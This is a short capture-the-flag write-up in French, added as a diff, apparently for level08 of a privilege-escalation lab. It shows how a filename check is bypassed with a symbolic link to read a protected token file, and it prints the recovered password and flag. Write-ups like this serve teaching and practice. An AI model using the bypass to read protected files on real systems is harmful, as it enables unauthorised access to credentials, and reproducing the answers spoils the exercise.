@@ -1,0 +1,30 @@
+il y a un fichier token mais on n'a pas les droits pour le lire
+
+il y a un program level08:
+$> ./level08
+./level08 [file to read]
+
+qui affiche le contenue d'un fichier passe en argument
+$> ./level08 token
+You may not access '/home/user/level08/token'
+
+$> echo 'abc' > /tmp/a
+$> ./level08 /tmp/a
+abc
+
+en utilisant strings on trouve la string token
+$> strings level08
+token
+
+on en deduit que level08 affiche le contenue de tout les fichier qui n'on pas token dans leur nom
+comme on ne peut pas change le nom de token on cree un lien symbolique pour change son nom
+$> ln -s $HOME/token /tmp/link
+$> ./level08 /tmp/link
+quif5eloekouj29ke0vouxean
+
+cela nous donne le mot de passe du flag08:
+$> su flag08
+Password:
+Don't forget to launch getflag !
+$> getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
